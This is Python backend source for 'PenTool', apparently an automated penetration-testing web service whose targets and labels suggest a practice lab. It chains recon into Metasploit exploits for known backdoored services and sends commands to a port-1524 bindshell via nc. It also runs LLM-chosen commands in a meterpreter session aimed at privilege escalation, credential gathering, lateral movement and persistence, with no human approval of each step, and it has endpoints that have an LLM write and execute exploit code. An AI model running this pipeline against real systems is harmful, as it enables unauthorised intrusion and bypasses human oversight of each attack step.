def vulnerability_has_recon_evidence(vuln: dict, raw_scan: str) -> bool:
    text = (raw_scan or "").lower()
    port = str(vuln.get("port") or "").strip().lower()
    service = str(vuln.get("service") or "").strip().lower()
    name = str(vuln.get("vuln_name") or "").strip().lower()
    if port in {"", "n/a", "na", "none", "unknown", "-"}:
        return False
    if f"{port}/tcp" in text or f"{port}/udp" in text or f"port: {port}" in text:
        return True
    if service and service not in {"unknown", "n/a", "na", "-"} and service in text:
        return True
    strong_terms = ["ssl", "tls", "anonymous", "default", "expired", "weak", "http", "smtp", "dns"]
    return any(term in name and term in text for term in strong_terms)


def valid_exploit_suggestion(exploit: dict) -> bool:
    name = str(exploit.get("exploit_name") or "").strip().lower()
    tool = str(exploit.get("tool_used") or "").strip().lower()
    payload = str(exploit.get("payload") or "").strip().lower()
    result = str(exploit.get("result") or "").strip().lower()
    if name in {"", "n/a", "na", "none", "ninguno", "no aplica"}:
        return False
    if tool in {"", "unknown", "desconocido", "n/a", "na"} and not payload:
        return False
    if "no se encontraron vulnerabilidades" in result:
        return False
    if "no hay" in result and "explot" in result:
        return False
    return True


def build_verified_msf_attempts(vulnerabilities: list, target: str) -> list:
    attempts = []
    for vuln in vulnerabilities:
        service = str(vuln.get("service") or "").lower()
        port = str(vuln.get("port") or "").strip()
        name_desc = f"{vuln.get('vuln_name', '')} {vuln.get('description', '')}".lower()
        if service == "ftp" and port == "21" and "vsftpd" in name_desc and "2.3.4" in name_desc:
            attempts.append(("exploit", "unix/ftp/vsftpd_234_backdoor", {"RHOST": target, "RPORT": port}))
        elif port in {"139", "445"} and ("samba" in name_desc and ("3.0.20" in name_desc or "usermap" in name_desc)):
            attempts.append(("exploit", "multi/samba/usermap_script", {"RHOST": target, "RPORT": port or "139"}))
        elif service == "irc" and port == "6667" and ("unreal" in name_desc and "3.2.8.1" in name_desc):
            attempts.append(("exploit", "unix/irc/unreal_ircd_3281_backdoor", {"RHOST": target, "RPORT": port}))
        elif port == "3632" and ("distcc" in service or "distcc" in name_desc):
            attempts.append(("exploit", "unix/misc/distcc_exec", {"RHOST": target, "RPORT": port}))
    return attempts


def run_full_analysis(
    target: str,
    scan_id: str,
    user: str = None,
    password: str = None,
    sudo_password: str = None,
    scan_type: str = "standard",
    intensity: str = "medium",
    options: Optional[Dict[str, Any]] = None,
):
    try:
        ensure_scan_not_paused(scan_id)
        scan_row = get_scan_run(scan_id)
        sl_no = scan_row[7] if scan_row and scan_row[7] else create_session(target)
        if not scan_row or not scan_row[7]:
            update_scan_run(scan_id, status="running", phase="recon", sl_no=sl_no)
        options = options or {}
        add_scan_event(
            scan_id,
            "status",
            "Escaneo iniciado",
            f"Objetivo: {target}\nPerfil: {scan_type}\nIntensidad: {intensity}",
            "recon",
        )

        recon_results = run_default_recon(
            target,
            scan_id=scan_id,
            scan_type=scan_type,
            options=options,
        )
        ensure_scan_not_paused(scan_id)
        raw_scan = format_recon_for_llm(recon_results)
        update_scan_run(scan_id, phase="analysis", raw_scan=raw_scan)
        add_scan_event(scan_id, "recon_complete", "Recon finalizado", raw_scan, "recon")

        analysis = analyse_target(target, raw_scan, scan_id=scan_id)
        confirmed_vulnerabilities = []
        discarded_vulnerabilities = []
        for vuln in analysis.get("vulnerabilities", []):
            if vulnerability_has_recon_evidence(vuln, raw_scan):
                confirmed_vulnerabilities.append(vuln)
            else:
                discarded_vulnerabilities.append(vuln)
        if discarded_vulnerabilities:
            add_scan_event(
                scan_id,
                "analysis_filter",
                "Hallazgos descartados por falta de evidencia",
                "\n".join(
                    f"- {v.get('vuln_name')} | puerto={v.get('port')} | servicio={v.get('service')}"
                    for v in discarded_vulnerabilities
                )[:2000],
                "analysis",
            )
        analysis["vulnerabilities"] = confirmed_vulnerabilities
        analysis["exploits"] = [exp for exp in analysis.get("exploits", []) if valid_exploit_suggestion(exp)]
        if not confirmed_vulnerabilities and discarded_vulnerabilities:
            analysis["risk_level"] = "LOW"
            analysis["summary"] = (
                "No se confirmaron vulnerabilidades con evidencia directa en el reconocimiento. "
                "Los hallazgos especulativos del modelo fueron descartados y se recomienda continuar con fingerprinting especifico."
            )
        ensure_scan_not_paused(scan_id)
        update_scan_run(
            scan_id,
            phase="persistence",
            risk_level=analysis["risk_level"],
            summary=analysis["summary"],
            llm_response=analysis["full_response"],
        )

        for vuln in analysis.get("vulnerabilities", []):
            vuln_id = save_vulnerability(
                sl_no,
                vuln["vuln_name"],
                vuln["severity"],
                vuln["port"],
                vuln["service"],
                vuln["description"],
            )
            if vuln.get("fix"):
                save_fix(sl_no, vuln_id, vuln["fix"])

        for exploit in analysis.get("exploits", []):
            save_exploit(
                sl_no,
                exploit["exploit_name"],
                exploit["tool_used"],
                exploit["payload"],
                exploit["result"],
                exploit["notes"],
            )
            add_scan_event(
                scan_id,
                "exploit_suggestion",
                exploit["exploit_name"],
                f"Tool: {exploit['tool_used']}\nPayload: {exploit['payload']}\nResult: {exploit['result']}\nNotes: {exploit['notes']}",
                "exploitation",
            )

        save_summary(sl_no, raw_scan, analysis["full_response"], analysis["risk_level"])

        # Prioritize direct root access from a 1524 bindshell before trying additional exploits.
        nmap_output = recon_results.get("nmap", "") if isinstance(recon_results, dict) else ""
        if "1524/tcp" in nmap_output and "open" in nmap_output.lower():
            bindshell_test_cmd = f"bash -lc \"printf 'id\\nwhoami\\nexit\\n' | timeout 8 nc {target} 1524\""
            bindshell_output = run_tool_by_command(bindshell_test_cmd, scan_id=scan_id, target=target)
            add_scan_event(scan_id, "bindshell_check", "Validando bindshell 1524", bindshell_output[:1200], "exploitation")
            if output_contains_root(bindshell_output):
                add_scan_event(scan_id, "root_achieved", "Root directo desde bindshell 1524", bindshell_output[:1200], "exploitation")
                update_scan_run(scan_id, status="completed", phase="completed")
                add_scan_event(scan_id, "status", "Escaneo completado", "Root directo detectado en bind shell 1524. No se requiere mayor explotación.", "completed")
                return {"sl_no": sl_no, "scan_id": scan_id, "result": analysis}

        update_scan_run(scan_id, phase="validation")
        add_scan_event(scan_id, "status", "Iniciando validacion guiada", "PenTool usara evidencia del recon y modulos verificados. Las sugerencias del LLM no se ejecutan como shell libre.", "validation")

        meterpreter_session_id = None

        for exploit in analysis.get("exploits", []):
            ensure_scan_not_paused(scan_id)
            add_scan_event(scan_id, "exploit_suggestion_kept", f"Sugerencia registrada: {exploit['exploit_name']}", "La sugerencia se usara como contexto para validacion, no como comando directo.", "validation")

        exploit_attempts = build_verified_msf_attempts(analysis.get("vulnerabilities", []), target)
        try:
            if exploit_attempts:
                msf = Metasploit(sudo_password=sudo_password)
                add_scan_event(scan_id, "msf_status", "Metasploit RPC conectado", "Intentando solo modulos con firma/version compatible", "metasploit")
                add_scan_event(scan_id, "msf_attempt", "Intentando explotacion con Metasploit", f"Probando {len(exploit_attempts)} exploits comunes", "exploitation")
                for module_type, module_name, options in exploit_attempts:
                    ensure_scan_not_paused(scan_id)
                    try:
                        result = msf.execute_module(module_type, module_name, options)
                        msf.save_to_db(scan_id, module_name, options, result)
                        add_scan_event(scan_id, "msf_result", f"Resultado de {module_name}", str(result)[:200], "metasploit")
                        if result.get("session_id"):
                            meterpreter_session_id = result["session_id"]
                            update_scan_run(scan_id, session_id=meterpreter_session_id)
                            add_scan_event(scan_id, "msf_session", f"Sesion Metasploit obtenida: {meterpreter_session_id}", f"Tipo: {module_name}", "metasploit")
                            break
                    except Exception as e:
                        add_scan_event(scan_id, "msf_module_error", f"Error con modulo {module_name}", str(e)[:100], "metasploit")
            else:
                add_scan_event(scan_id, "msf_skipped", "Metasploit omitido", "No hay modulos verificados para los servicios/versiones observados. Se continua con enumeracion adaptativa.", "validation")
        except Exception as e:
            add_scan_event(scan_id, "msf_error", "Error con Metasploit", str(e)[:200], "exploitation")

        try:
            run_ai_action_loop(target, scan_id, analysis, raw_scan=raw_scan, msf=msf if "msf" in locals() else None, session_id=meterpreter_session_id, max_steps=10 if not exploit_attempts else 16)
        except Exception as e:
            add_scan_event(scan_id, "ai_action_error", "Error en bucle IA de acciones", str(e)[:300], "ai_actions")

        if meterpreter_session_id:
            update_scan_run(scan_id, phase="post_exploitation", session_id=meterpreter_session_id)
            add_scan_event(scan_id, "status", "Iniciando fase de post-explotacion", f"Sesion activa: {meterpreter_session_id}", "post_exploitation")

            max_iterations = 10
            iteration = 0
            while iteration < max_iterations:
                ensure_scan_not_paused(scan_id)
                iteration += 1
                add_scan_event(scan_id, "post_exp_iteration", f"Iteracion {iteration}", f"Verificando privilegios...", "post_exploitation")
                try:
                    if msf.check_if_root(meterpreter_session_id):
                        add_scan_event(scan_id, "root_achieved", "ACCESO ROOT CONSEGUIDO", f"Sesion {meterpreter_session_id} tiene privilegios root", "post_exploitation")
                        break
                except Exception as e:
                    add_scan_event(scan_id, "root_check_error", f"Error verificando root: {str(e)}", "", "post_exploitation")

                try:
                    sysinfo_cmds = [
                        "whoami",
                        "id",
                        "uname -a",
                        "ls -la /",
                        "ps aux | head -10",
                        "netstat -tulpn | head -10",
                    ]
                    sysinfo = ""
                    for cmd in sysinfo_cmds:
                        try:
                            output = msf.session_interact(meterpreter_session_id, cmd)
                            sysinfo += f"[{cmd}]\n{output}\n\n"
                        except Exception:
                            sysinfo += f"[{cmd}]\n[!] Command failed\n\n"

                    ai_prompt = f"""
You have a meterpreter session on the target machine. Current information:

{sysinfo}

Based on this information, suggest the NEXT command to execute to progress toward gaining root access or gathering valuable information.

Consider:
1. Privilege escalation techniques (check for SUID binaries, kernel exploits, misconfigurations)
2. Information gathering (password files, configurations, databases)
3. Lateral movement possibilities
4. Persistence mechanisms

Format your response as:
COMMAND: [the exact command to execute]
REASON: [brief explanation of why this command is useful]
"""
                    ai_response = ask_lm_studio([
                        {"role": "system", "content": "You are an expert penetration tester helping to gain root access through a meterpreter session."},
                        {"role": "user", "content": ai_prompt},
                    ])
                    command_match = re.search(r'COMMAND:\s*(.+)', ai_response, re.IGNORECASE)
                    if command_match:
                        next_command = command_match.group(1).strip().split("\n")[0].strip()
                        add_scan_event(scan_id, "ai_suggestion", f"IA sugiere: {next_command}", f"Razon: {ai_response[:100]}", "post_exploitation")
                        try:
                            output = msf.session_interact(meterpreter_session_id, next_command)
                            add_scan_event(scan_id, "command_result", f"Resultado de: {next_command}", output[:300], "post_exploitation")
                            try:
                                conn = get_connection()
                                c = conn.cursor()
                                c.execute(
                                    "INSERT INTO scan_results (scan_id, command, output, target, timestamp) VALUES (?, ?, ?, ?, ?)",
                                    (scan_id, next_command, output, target, datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
                                )
                                conn.commit()
                                conn.close()
                            except Exception as db_e:
                                add_scan_event(scan_id, "db_error", f"Error guardando resultado: {str(db_e)}", "", "post_exploitation")
                        except Exception as cmd_e:
                            add_scan_event(scan_id, "command_error", f"Error ejecutando comando: {str(cmd_e)}", "", "post_exploitation")
                    else:
                        add_scan_event(scan_id, "ai_no_command", "IA no sugirió un comando claro", f"Respuesta: {ai_response[:200]}", "post_exploitation")
                        basic_cmds = ["whoami", "id", "sudo -l", "find / -perm -4000 -type f 2>/dev/null | head -5"]
                        for basic_cmd in basic_cmds:
                            try:
                                output = msf.session_interact(meterpreter_session_id, basic_cmd)
                                add_scan_event(scan_id, "basic_enum", f"Enumeracion básica: {basic_cmd}", output[:100], "post_exploitation")
                                break
                            except Exception:
                                continue
                except Exception as ai_e:
                    add_scan_event(scan_id, "ai_error", f"Error consultando IA: {str(ai_e)}", "", "post_exploitation")
                import time
                time.sleep(2)

            try:
                if msf.check_if_root(meterpreter_session_id):
                    add_scan_event(scan_id, "root_achieved_final", "ACCESO ROOT CONSEGUIDO (FINAL)", f"Sesion {meterpreter_session_id} tiene privilegios root", "post_exploitation")
                else:
                    add_scan_event(scan_id, "root_not_achieved", "No se consiguió acceso root despues de todas las iteraciones", f"Sesion: {meterpreter_session_id}", "post_exploitation")
            except Exception as e:
                add_scan_event(scan_id, "root_check_final_error", f"Error en chequeo final de root: {str(e)}", "", "post_exploitation")

        update_scan_run(scan_id, status="completed", phase="completed")
        add_scan_event(scan_id, "status", "Escaneo completado", analysis["summary"], "completed")
        return {"sl_no": sl_no, "scan_id": scan_id, "result": analysis}
    except ScanPaused:
        update_scan_run(scan_id, status="paused", phase="paused")
        add_scan_event(scan_id, "status", "Escaneo pausado", "La automatizacion fue pausada por el usuario.", "paused")
        raise
    except Exception as exc:
        update_scan_run(scan_id, status="failed", phase="failed", error=str(exc))
        add_scan_event(scan_id, "error", "Fallo del escaneo", str(exc), "failed")
        raise


@app.get("/")
async def root():
    from fastapi.responses import FileResponse

    index_path = os.path.join(os.path.dirname(__file__), "frontend", "index.html")
    if os.path.exists(index_path):
        return FileResponse(index_path)
    return {"message": "PenTool", "api_docs": "/docs"}


def _local_network_urls() -> list:
    port = int(os.getenv("PENTOOL_PORT", "8000"))
    addresses = set()
    try:
        addresses.update(socket.gethostbyname_ex(socket.gethostname())[2])
    except OSError:
        pass
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
            probe.connect(("8.8.8.8", 80))
            addresses.add(probe.getsockname()[0])
    except OSError:
        pass
    return [
        f"http://{address}:{port}"
        for address in sorted(addresses)
        if address and not address.startswith(("127.", "169.254."))
    ]


@app.get("/health")
async def health_check():
    return {
        "status": "ok",
        "service": "PenTool",
        "version": "2.0",
        "time": datetime.now().isoformat(timespec="seconds"),
    }


@app.get("/system/health")
async def system_health(api_key: str = Security(verify_api_key)):
    database_ok = False
    try:
        conn = get_connection()
        conn.execute("SELECT 1").fetchone()
        conn.close()
        database_ok = True
    except Exception:
        database_ok = False

    llm_config = load_llm_config()
    tools = get_tool_inventory()
    return {
        "status": "healthy" if database_ok else "degraded",
        "database": {"status": "online" if database_ok else "offline"},
        "llm": {
            "configured": bool(llm_config.get("model")),
            "provider": llm_config.get("provider"),
            "model": llm_config.get("model"),
        },
        "network": {
            "bind_host": os.getenv("PENTOOL_HOST", "0.0.0.0"),
            "port": int(os.getenv("PENTOOL_PORT", "8000")),
            "lan_urls": _local_network_urls(),
        },
        "tools": tools,
    }


@app.post("/token")
async def generate_token(request: TokenRequest):
    extra_keys = {key.strip() for key in os.getenv("PENTOOL_EXTRA_API_KEYS", "").split(",") if key.strip()}
    valid_keys = {API_KEY, *LEGACY_API_KEYS, *extra_keys}
    if request.api_key not in valid_keys:
        raise HTTPException(status_code=401, detail="Invalid API key")
    token = create_jwt_token({"sub": "pentool-user"})
    return {"access_token": token, "token_type": "bearer"}


@app.get("/auth")
async def auth_test(api_key: str = Security(verify_api_key)):
    return {"message": "Authenticated", "api_key": api_key}


@app.get("/history")
async def get_history(api_key: str = Security(verify_api_key)):
    try:
        history = get_all_history()
        return [
            {
                "sl_no": row[0],
                "target": row[1],
                "timestamp": row[2],
                "status": row[3],
                "scan_id": row[4] if len(row) > 4 else None,
            }
            for row in history
        ]
    except Exception as exc:
        print(f"Error fetching history: {exc}")
        return []


@app.get("/vulnerabilities")
async def get_all_vulns(api_key: str = Security(verify_api_key), scan_id: Optional[str] = None, sl_no: Optional[int] = None):
    try:
        all_vulns = get_vulnerabilities()
        fixes = get_all_fixes()
        history_by_sl = {
            row[0]: {"target": row[1], "scan_id": row[4] if len(row) > 4 else None}
            for row in get_all_history()
        }
        fixes_by_vuln = {}
        for row in fixes:
            fixes_by_vuln.setdefault(row[2], []).append(row[3])
        
        vulns = []
        for row in all_vulns:
            # Filter by sl_no if provided
            if sl_no is not None and row[1] != sl_no:
                continue
            
            target_info = history_by_sl.get(row[1], {}).copy()
            if not target_info.get("target"):
                scan_for_vuln = get_scan_run_by_sl_no(row[1])
                if scan_for_vuln:
                    target_info = {"target": scan_for_vuln[1], "scan_id": scan_for_vuln[0]}

            vuln_dict = {
                "id": row[0],
                "sl_no": row[1],
                "target": target_info.get("target"),
                "scan_id": target_info.get("scan_id"),
                "vuln_name": row[2],
                "severity": row[3],
                "port": row[4],
                "service": row[5],
                "description": row[6],
                "fix": "\n".join(fixes_by_vuln.get(row[0], [])),
            }
            
            # If scan_id is provided, try to match via sl_no
            if scan_id is not None:
                scan_run = get_scan_run(scan_id)
                if scan_run and scan_run[7] == row[1]:
                    vulns.append(vuln_dict)
            else:
                vulns.append(vuln_dict)
        
        return vulns
    except Exception as exc:
        print(f"Error fetching vulnerabilities: {exc}")
        return []


@app.post("/vulnerabilities/{vuln_id}/exploit")
async def exploit_vulnerability(vuln_id: int, request: VulnerabilityExploitRequest, api_key: str = Security(verify_api_key)):
    try:
        vuln_row = get_vulnerability(vuln_id)
        if not vuln_row:
            raise HTTPException(status_code=404, detail="Vulnerability not found")

        sl_no = vuln_row[1]
        vulnerability = {
            "id": vuln_row[0],
            "sl_no": sl_no,
            "vuln_name": vuln_row[2],
            "severity": vuln_row[3],
            "port": vuln_row[4],
            "service": vuln_row[5],
            "description": vuln_row[6],
        }

        scan_id = request.scan_id
        target = None
        scan = None
        if scan_id:
            scan = get_scan_run(scan_id)
            if not scan:
                raise HTTPException(status_code=404, detail="Scan not found")
            target = scan[1]
        else:
            scan = get_scan_run_by_sl_no(sl_no)
            if scan:
                scan_id = scan[0]
                target = scan[1]

        if not target:
            session = get_session(sl_no)
            history = session.get("history")
            if not history:
                raise HTTPException(status_code=404, detail="Vulnerability target not found")
            target = history[1]

        if not scan_id:
            scan_id = generate_scan_id()
            create_scan_run(scan_id, target, status="running", phase="exploitation")
            add_scan_event(scan_id, "status", "Explotacion por vulnerabilidad iniciada", f"Objetivo: {target}", "exploitation")

        attacker_ip = request.attacker_ip or load_llm_config().get("attacker_ip") or os.getenv("ATTACKER_IP")
        if attacker_ip:
            add_scan_event(scan_id, "attacker_ip", "IP de ataque", attacker_ip, "exploitation")

        exploit = generate_exploit(target, vulnerability, scan_id, attacker_ip=attacker_ip)
        exploit["vulnerability"] = vulnerability
        exploit["attacker_ip"] = attacker_ip
        output = ""
        if exploit.get("executable"):
            output = execute_exploit(target, request.user, request.password, exploit, scan_id, attacker_ip=attacker_ip)
        else:
            output = exploit.get("notes") or "No hay un módulo automático verificado para esta vulnerabilidad."

        add_scan_event(scan_id, "exploit_attempt", f"Exploit {exploit['exploit_name']}", output[:3000], "exploitation")
        save_exploit(sl_no, exploit["exploit_name"], exploit["tool_used"], exploit["payload"], exploit["result"], exploit["notes"])
        audit_event("web", "vulnerability_exploit", f"Attempted exploit for vulnerability {vulnerability['vuln_name']}", scan_id=scan_id, vuln_id=vulnerability['id'])

        return {
            "scan_id": scan_id,
            "target": target,
            "vulnerability": {
                "id": vulnerability["id"],
                "name": vulnerability["vuln_name"],
                "severity": vulnerability["severity"],
                "port": vulnerability["port"],
                "service": vulnerability["service"],
            },
            "exploit": {
                "name": exploit.get("exploit_name", "Unknown"),
                "tool": exploit.get("tool_used", "ai_generated"),
                "payload": exploit.get("payload", ""),
                "result": exploit.get("result", "not_executed"),
                "notes": exploit.get("notes", ""),
                "executable": exploit.get("executable", False),
            },
            "command": exploit.get("payload", ""),
            "output": output,
            "status": exploit.get("result", "not_executed"),
        }
    except HTTPException:
        raise
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.get("/exploits")
async def get_all_exploits(api_key: str = Security(verify_api_key)):
    try:
        exploits = db_get_all_exploits()
        return [
            {
                "id": row[0],
                "sl_no": row[1],
                "exploit": row[2],
                "tool": row[3],
                "payload": row[4],
                "result": row[5],
            }
            for row in exploits
        ]
    except Exception as exc:
        print(f"Error fetching exploits: {exc}")
        return []


@app.get("/exploit-library")
async def get_exploit_library(api_key: str = Security(verify_api_key), target: Optional[str] = None):
    try:
        return [_artifact_to_dict(row) for row in list_exploit_artifacts(target=target)]
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.post("/exploit-library")
async def create_exploit_artifact(request: ExploitArtifactRequest, api_key: str = Security(verify_api_key)):
    try:
        artifact_id = save_exploit_artifact(
            target=request.target,
            scan_id=request.scan_id,
            sl_no=request.sl_no,
            vuln_id=request.vuln_id,
            title=request.title or "Payload sin titulo",
            cve=request.cve or "",
            language=request.language or "python",
            filename=request.filename or "",
            code=request.code,
            notes=request.notes or "",
            status=request.status or "draft",
        )
        artifact = _artifact_to_dict(get_exploit_artifact(artifact_id))
        file_path = write_exploit_artifact_file(artifact)
        update_exploit_artifact(artifact_id, filename=file_path.name)
        artifact = _artifact_to_dict(get_exploit_artifact(artifact_id))
        audit_event("web", "exploit_artifact_created", f"Exploit artifact {artifact_id} created for {request.target}", scan_id=request.scan_id, vuln_id=request.vuln_id)
        return artifact
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.put("/exploit-library/{artifact_id}")
async def update_exploit_library_item(artifact_id: int, request: ExploitArtifactUpdateRequest, api_key: str = Security(verify_api_key)):
    artifact = _artifact_to_dict(get_exploit_artifact(artifact_id))
    if not artifact:
        raise HTTPException(status_code=404, detail="Exploit artifact not found")
    fields = {key: value for key, value in request.dict().items() if value is not None}
    try:
        update_exploit_artifact(artifact_id, **fields)
        artifact = _artifact_to_dict(get_exploit_artifact(artifact_id))
        file_path = write_exploit_artifact_file(artifact)
        if artifact.get("filename") != file_path.name:
            update_exploit_artifact(artifact_id, filename=file_path.name)
            artifact = _artifact_to_dict(get_exploit_artifact(artifact_id))
        audit_event("web", "exploit_artifact_updated", f"Exploit artifact {artifact_id} updated", scan_id=artifact.get("scan_id"), vuln_id=artifact.get("vuln_id"))
        return artifact
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc))


@app.delete("/exploit-library/{artifact_id}")
async def delete_exploit_library_item(artifact_id: int, api_key: str = Security(verify_api_key)):
    artifact = _artifact_to_dict(get_exploit_artifact(artifact_id))
    if not artifact:
        raise HTTPException(status_code=404, detail="Exploit artifact not found")
    delete_exploit_artifact(artifact_id)
    audit_event("web", "exploit_artifact_deleted", f"Exploit artifact {artifact_id} deleted", scan_id=artifact.get("scan_id"), vuln_id=artifact.get("vuln_id"))
    return {"message": "Exploit artifact deleted", "id": artifact_id}


@app.post("/exploit-library/ai")
async def exploit_library_ai(request: ExploitAiRequest, api_key: str = Security(verify_api_key)):
    artifact = _artifact_to_dict(get_exploit_artifact(request.artifact_id)) if request.artifact_id else None
    
    # Gather context from vulnerability and scan
    vuln_context = ""
    vuln_name = ""
    service = ""
    port = ""
    if request.vuln_id:
        vuln = get_vulnerability(request.vuln_id)
        if vuln:
            vuln_name = vuln[2] or ""
            service = vuln[5] or ""
            port = str(vuln[4] or "")
            vuln_context = f"Vulnerabilidad: {vuln[2]}\nSeveridad: {vuln[3]}\nPuerto: {vuln[4]}\nServicio: {vuln[5]}\nDescripcion: {vuln[6]}"
    
    scan_context = ""
    raw_scan = ""
    if request.scan_id:
        scan = _scan_run_to_dict(get_scan_run(request.scan_id))
        if scan:
            raw_scan = scan.get('raw_scan') or ''
            scan_context = f"Recon confirmado:\n{raw_scan[:6000]}"

    current_code = artifact.get("code", "") if artifact else ""
    cve_value = request.cve or (artifact.get("cve") if artifact else "")
    
    # Comprehensive web research
    research_results = []
    
    # Search by CVE if present
    detected_cve = re.search(r"CVE-\d{4}-\d{4,7}", f"{cve_value} {vuln_name} {request.prompt}", re.IGNORECASE)
    if detected_cve:
        cve = detected_cve.group(0)
        queries = [
            f"{cve} exploit proof of concept",
            f"{cve} technical details",
            f"{cve} metasploit module",
        ]
        for query in queries:
            try:
                result = handle_search_dispatch(query)
                if result and "no se encontro" not in result.lower():
                    research_results.append(f"=== Busqueda: {query} ===\n{result}")
            except Exception as e:
                research_results.append(f"=== Error buscando {query}: {str(e)} ===")
    
    # Search by service/version if no CVE or additional context needed
    if service and port:
        queries = [
            f"{service} {port} exploit",
            f"{service} vulnerability proof of concept",
        ]
        for query in queries:
            try:
                result = handle_search_dispatch(query)
                if result and "no se encontro" not in result.lower():
                    research_results.append(f"=== Busqueda: {query} ===\n{result}")
            except Exception as e:
                research_results.append(f"=== Error buscando {query}: {str(e)} ===")
    
    # Search by vulnerability name
    if vuln_name:
        query = f"{vuln_name} exploit PoC"
        try:
            result = handle_search_dispatch(query)
            if result and "no se encontro" not in result.lower():
                research_results.append(f"=== Busqueda: {query} ===\n{result}")
        except Exception as e:
            research_results.append(f"=== Error buscando {query}: {str(e)} ===")
    
    # Search by prompt keywords
    keywords = re.findall(r'\b\w{4,}\b', request.prompt)
    if keywords:
        key_query = ' '.join(keywords[:5])  # First 5 keywords
        query = f"{key_query} exploit tutorial"
        try:
            result = handle_search_dispatch(query)
            if result and "no se encontro" not in result.lower():
                research_results.append(f"=== Busqueda: {query} ===\n{result}")
        except Exception as e:
            research_results.append(f"=== Error buscando {query}: {str(e)} ===")
    
    research_context = "\n\n".join(research_results) if research_results else "No se encontraron resultados adicionales en la web."
    
    # Build comprehensive prompt
    prompt = f"""Eres el asistente de desarrollo de exploits de PenTool para un laboratorio autorizado.
Responde en espanol, sin markdown salvo que devuelvas codigo en un unico bloque.

OBJETIVO AUTORIZADO: {request.target}
CVE/Referencia: {cve_value}
NOMBRE VULNERABILIDAD: {vuln_name}
SERVICIO: {service}
PUERTO: {port}
LENGUAJE PREFERIDO: {request.language or (artifact.get('language') if artifact else 'python')}

INFORMACION DE RECON:
{scan_context if scan_context else raw_scan[:4000] if raw_scan else 'No hay recon disponible.'}

INFORMACION DE LA VULNERABILIDAD:
{vuln_context if vuln_context else 'No hay contexto de vulnerabilidad.'}

INVESTIGACION WEB (CVE, exploits, PoCs):
{research_context[:12000]}

CODIGO ACTUAL:
{current_code if current_code else 'No hay codigo previo.'}

PEDIDO DEL OPERADOR:
{request.prompt}

INSTRUCCIONES:
1. Analiza TODA la informacion anterior (recon, vulnerabilidad, investigacion web).
2. Si hay CVE, usa la informacion tecnica encontrada para crear un exploit valido.
3. Si hay servicio/version identificados, busca exploits especificos para esa version.
4. El codigo debe ser NO DESTRUCTIVO y orientado a VERIFICAR la vulnerabilidad.
5. Parametriza target/puertos/credenciales cuando sea posible.
6. Si necesitas mas informacion, indica que comandos de enumeracion deberian ejecutarse primero.
7. Devuelve primero una explicacion corta en espanol y luego, si corresponde, un unico bloque de codigo completo.
"""
    
    ai_response = ask_lm_studio([
        {"role": "system", "content": "Eres un desarrollador senior de exploits para pruebas autorizadas. Tienes acceso a investigacion web sobre CVEs, exploits y PoCs. Prioriza codigo verificable, controlado y no destructivo. Usa la informacion de recon y vulnerabilidades para crear exploits precisos."},
        {"role": "user", "content": prompt},
    ])
    
    code = extract_code_block(ai_response)
    clean_response = plain_ai_text(ai_response)
    
    return {"response": clean_response, "code": code}


@app.post("/exploit-library/{artifact_id}/analyze")
async def analyze_exploit_artifact(artifact_id: int, api_key: str = Security(verify_api_key)):
    artifact = _artifact_to_dict(get_exploit_artifact(artifact_id))
    if not artifact:
        raise HTTPException(status_code=404, detail="Exploit artifact not found")
    prompt = f"""
Analiza este payload de PenTool en texto plano y espanol.
Objetivo: {artifact.get('target')}
Titulo: {artifact.get('title')}
CVE: {artifact.get('cve')}
Lenguaje: {artifact.get('language')}

Codigo:
{artifact.get('code')}

Devuelve:
1. Que hace.
2. Precondiciones.
3. Riesgos operativos.
4. Indicadores de exito.
5. Mejoras recomendadas.
No uses markdown.
"""
    ai_response = ask_lm_studio([
        {"role": "system", "content": "Eres un revisor de exploits para pruebas autorizadas. No inventes resultados."},
        {"role": "user", "content": prompt},
    ])
    return {"analysis": plain_ai_text(ai_response)}


@app.post("/exploit-library/{artifact_id}/run")
async def run_exploit_artifact(artifact_id: int, request: ExploitRunRequest, api_key: str = Security(verify_api_key)):
    artifact = _artifact_to_dict(get_exploit_artifact(artifact_id))
    if not artifact:
        raise HTTPException(status_code=404, detail="Exploit artifact not found")
    try:
        file_path = write_exploit_artifact_file(artifact)
        language = (artifact.get("language") or "").lower()
        if language in {"python", "py"}:
            sanitize_python_exploit_file(file_path)
            command = f"{shlex.quote(sys.executable)} {shlex.quote(str(file_path))} {request.args or ''}".strip()
        elif language in {"bash", "sh"}:
            command = f"bash {shlex.quote(str(file_path))} {request.args or ''}".strip()
        elif language == "ruby":
            command = f"ruby {shlex.quote(str(file_path))} {request.args or ''}".strip()
        elif language == "perl":
            command = f"perl {shlex.quote(str(file_path))} {request.args or ''}".strip()
        else:
            raise HTTPException(status_code=400, detail="Language execution is not supported for this artifact")
        if is_blocked_command(command):
            raise HTTPException(status_code=400, detail="Command blocked by safety policy")
        output = run_tool_by_command(command, scan_id=artifact.get("scan_id") or "exploit-library", target=artifact.get("target") or "local")
        if language in {"python", "py"} and "Unsupported argument" in output and "mysql.connector" in output:
            if sanitize_python_exploit_file(file_path):
                output += "\n\n[!] Script sanitized for unsupported mysql.connector arguments. Re-running...\n"
                output += run_tool_by_command(command, scan_id=artifact.get("scan_id") or "exploit-library", target=artifact.get("target") or "local")
        update_exploit_artifact(artifact_id, status="executed", last_result=output)
        audit_event("web", "exploit_artifact_run", f"Exploit artifact {artifact_id} executed", scan_id=artifact.get("scan_id"), vuln_id=artifact.get("vuln_id"))
        return {"command": command, "output": output}
    except HTTPException:
        raise
    except Exception as exc:
        update_exploit_artifact(artifact_id, status="error", last_result=str(exc))
        raise HTTPException(status_code=500, detail=str(exc))


def _llm_request_data(request: LLMConfigRequest) -> Dict[str, Any]:
    return request.model_dump() if hasattr(request, "model_dump") else request.dict()


def _effective_llm_config(request: Optional[LLMConfigRequest] = None) -> Dict[str, Any]:
    """Merge a browser request with saved secrets only for the same endpoint."""
    if request is None:
        return load_llm_config()

    existing = load_llm_config()
    payload = _llm_request_data(request)
    clear_api_key = bool(payload.pop("clear_api_key", False))
    clear_extra_headers = bool(payload.pop("clear_extra_headers", False))
    candidate = normalize_llm_config(payload)
    same_endpoint = (
        candidate["provider"] == existing["provider"]
        and candidate["api_base"].rstrip("/") == existing["api_base"].rstrip("/")
    )
